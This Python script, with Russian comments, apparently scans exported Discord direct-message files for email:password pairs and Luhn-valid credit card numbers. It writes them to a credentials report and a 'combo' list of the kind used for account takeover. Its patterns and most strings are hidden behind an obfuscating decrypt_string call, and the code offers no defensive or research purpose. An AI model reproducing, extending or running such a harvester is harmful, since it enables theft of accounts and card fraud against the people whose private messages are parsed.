"""
discord_parser.py — парсер email:pass из выгруженных Discord DM файлов.
Запуск: python core/discord_parser.py <папка_или_файл>
"""
import os
import re
import sys
from typing import List, Dict
from core.obfuscation import decrypt_string
_EMAIL_RE = re.compile(decrypt_string('NVNVEQ98A1J3TjUWWWVLJ0VyIwpjKxhPAEdHAS4UO1EyHCMKYysYTwAqEQpeDxsmDA=='))
_PASS_RE  = re.compile(
    r'(?:' +
    decrypt_string('HlMLGGZuYxU1BQ4RTUW2xb6Cqeue74nZi/sWSBNKFQ0KTggcKg==') +
    decrypt_string('R2lFURIiBU+YzIi+4AM7UUZpJjc9fQU=') + r'[\x21-\x7E]{4,64})',
    re.IGNORECASE
)
_CARD_SPACED_RE = re.compile(decrypt_string('MlAkDzVlJDl6K0dlLl0dThNpWDdjDAUGIUMXY1JlSycyVgNYYmUkPjg='))
_CARD_PLAIN_RE  = re.compile(decrypt_string('MlAjWHpkbz8GExEJQBVXTxNuGg=='))   
_PAIR_RE  = re.compile(
    decrypt_string('RmkZRjQQdDhqWlNnXBI6VzMZODAvfCMjdy1aFUtlSydFblYwL3wjI3ctN0NAFVAHMlBR') +
    decrypt_string('NW4LUXUNJU4HXA==') +
    decrypt_string('RmkmNz1rYj4mW1YGL0JSVlgGBUI=')
)
_DISCORD_URL_RE = re.compile(
    decrypt_string('BkYMGz1uY011X1UCEV0IBgNXHAIveAVMPh4ZWx1LAhseQiRFZm5jDD8DFlsdVE9VMmFT')
)
def _luhn(number: str) -> bool:
    decrypt_string("vq2p657vidCKwru4ooO2yk5+DQMgcbvizle6hqO7t/u+h6jTnuOJ0orCu7pS6Oeq1eP7usmB6bLjp9fp+enTWr+1qNOf0InZisdE")
    digits = [int(d) for d in number if d.isdigit()]
    odd = digits[-1::-2]
    even = [d*2 - 9 if d*2 > 9 else d*2 for d in digits[-2::-2]]
    return (sum(odd) + sum(even)) % 10 == 0
def _clean_line(line: str) -> str:
    decrypt_string("vpGo2p7piOKKx7qNooVGPgdBGwQ8NXkhHjlH6fPo56vl4sO79IHhQorPuo9S6Oer7OP4u/CB47LiV7qHooy3+r6HqN9ugeay6qbq6fPp3qrT4su78IHlTA==")
    return _DISCORD_URL_RE.sub('', line)
def parse_file(path: str) -> List[Dict[str, str]]:
    found = []
    if os.path.basename(path).startswith(("discord_credentials", "_CREDENTIALS")):
        return found
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
    except Exception:
        return found
    for lineno, line in enumerate(lines, 1):
        clean = _clean_line(line)
        for m in _PAIR_RE.finditer(clean):
            email, password = m.group(1), m.group(2)
            if password in ("[IMG]", "[GIF]", "[VIDEO]", "[AUDIO]", "[ATTACH]") or password.startswith(decrypt_string("NXQxJwtr")):
                continue
            found.append({
                "type":     "PAIR",
                "email":    email,
                "password": password,
                "line":     lineno,
                "source":   os.path.basename(path),
                "context":  line.strip()[:120],
            })
        emails_in_line = _EMAIL_RE.findall(clean)
        passes_in_line = _PASS_RE.findall(clean)
        if emails_in_line and passes_in_line:
            for email in emails_in_line:
                for pw in passes_in_line:
                    if not any(r.get("email") == email and r.get("password") == pw
                               for r in found):
                        found.append({
                            "type":     "PAIR",
                            "email":    email,
                            "password": pw,
                            "line":     lineno,
                            "source":   os.path.basename(path),
                            "context":  line.strip()[:120],
                        })
        for m in _CARD_SPACED_RE.finditer(clean):
            digits = re.sub(decrypt_string('NRIkRhM='), '', m.group(0))
            if _luhn(digits):
                found.append({
                    "type":    "CARD",
                    "value":   m.group(0),
                    "line":    lineno,
                    "source":  os.path.basename(path),
                    "context": line.strip()[:120],
                })
        for m in _CARD_PLAIN_RE.finditer(clean):
            num = m.group(0)
            if _luhn(num):
                found.append({
                    "type":    "CARD",
                    "value":   num,
                    "line":    lineno,
                    "source":  os.path.basename(path),
                    "context": line.strip()[:120],
                })
    return found
def parse_folder(folder: str) -> List[Dict[str, str]]:
    all_results = []
    try:
        for fname in os.listdir(folder):
            if fname.endswith(decrypt_string("QEYAHw==")):
                all_results.extend(parse_file(os.path.join(folder, fname)))
    except Exception:
        pass
    seen = set()
    unique = []
    for r in all_results:
        if r["type"] == "PAIR":
            key = ("PAIR", r.get("email", "").lower(), r.get("password", ""))
        else:
            key = ("CARD", r.get("value", ""))
        if key not in seen:
            seen.add(key)
            unique.append(r)
    return unique
def format_results(results: List[Dict[str, str]]) -> str:
    pairs = [r for r in results if r.get("type") == "PAIR"]
    cards = [r for r in results if r.get("type") == "CARD"]
    if not results:
        return decrypt_string("jK/0S57MidqL8LqNooq2xE7ixbv7cYnfise6gaKNts++j6jVYA==")
    lines = ["🔑 ═══ DISCORD CREDENTIALS REPORT ═══ 🔑",
             decrypt_string("vq2o25/ReQc3FgNUSEkHCR0IWBAiNDdKKhYDSgEQG1pOEqjxnuGI4ov1UBgJVQMURlEZGSoicB8="), ""]
    if pairs:
        lines.append(decrypt_string("jKb4idrReScXNiN0SGknKT0Smv/Os83i"))
        for r in pairs:
            lines.append(decrypt_string("FUAjTCs8OAs2UDdFSEIUIUlCGRg9JjYQPlA3RQ=="))
            lines.append(decrypt_string("ThKI9N3VeRkoLE1LHUwUGQsVJRZ0Kis5fRsDVhceOwdO0P75biorOX0UBVYGXB4OSW8jUXZhBB8="))
            lines.append("")
    if cards:
        lines.append("── КАРТЫ ──")
        for r in cards:
            lines.append(f"{r['value']}")
            lines.append(decrypt_string("ThKI9N3VeRkoLE1LHUwUGQsVJRZ0Kis5fRsDVhceOwdO0P75biorOX0UBVYGXB4OSW8jUXZhBB8="))
            lines.append("")
    lines.append("═" * 40)
    return "\n".join(lines)
def save_results(results: List[Dict[str, str]], out_path: str):
    decrypt_string("vpOo1Z/UiOKKx7qFo7a2z7+wWLrOgeyy7abp6Mno6qvs4si6zIDSQorFSujG6dSr7eP9S5/VidyL97qEoom3+L6Cqe50cSsHOxMLWh5cRqrWEhsZKzU8DC4eC1RfVggWFxw=")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(format_results(results))
    combo_path = out_path.replace(decrypt_string("QEYAHw=="), decrypt_string("MVEXBiw+dxYiAw=="))
    with open(combo_path, "w", encoding="utf-8") as f:
        for r in results:
            if r.get("type") == "PAIR":
                f.write(decrypt_string("FUAjTCs8OAs2UDdFSEIUIUlCGRg9JjYQPlA3RS5X"))
            elif r.get("type") == "CARD":
                f.write(decrypt_string("LXMqL3QqKzl9AQtUB1xBJxNuFg=="))
    return combo_path
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(decrypt_string("vqqp6p7uidyKzLu0oo62xL6AqNue7InaisJQGAJAEhIBXFgPJyI6DSgTNUgTSxUfHBwIEm5tid2Kx7qHooO2yjHiwLv1geE9i/O6iKKAtsFQ"))
        sys.exit(1)
    target = sys.argv[1]
    if os.path.isdir(target):
        results = parse_folder(target)
    elif os.path.isfile(target):
        results = parse_file(target)
    else:
        print(decrypt_string("jK/0S57Midd6p9fowunfqtrizbvzgedYegweWQBeAw4T"))
        sys.exit(1)
    print(format_results(results))
    if results:
        out = os.path.join(target if os.path.isdir(target) else os.path.dirname(target),
                           decrypt_string("ClsLCCEjPT05BQ9cF1cSEw9eC0U6KS0="))
        combo = save_results(results, out)
        print(decrypt_string("Mlya98txicOKybu9o7m2yr6PqN6e7IncYFcRVwdNGw=="))
        print(decrypt_string("jK79Sw0+NAA1TUpDEVYLGAFP"))
